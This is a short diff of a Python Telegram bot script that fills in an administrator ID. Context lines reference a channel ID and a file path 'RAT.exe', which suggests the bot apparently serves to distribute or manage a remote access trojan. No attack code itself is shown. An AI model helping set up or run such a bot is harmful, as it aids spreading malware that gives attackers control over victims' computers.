@@ -12,7 +12,7 @@ CHANNEL_ID = '-1002331312384'
 RAT_FILE_PATH = 'RAT.exe'
 
 # ID администратора
-ADMIN_ID = 'YOUR_ADMIN_ID'
+ADMIN_ID = '1258446750'
 
 bot = telebot.TeleBot(API_TOKEN)
 
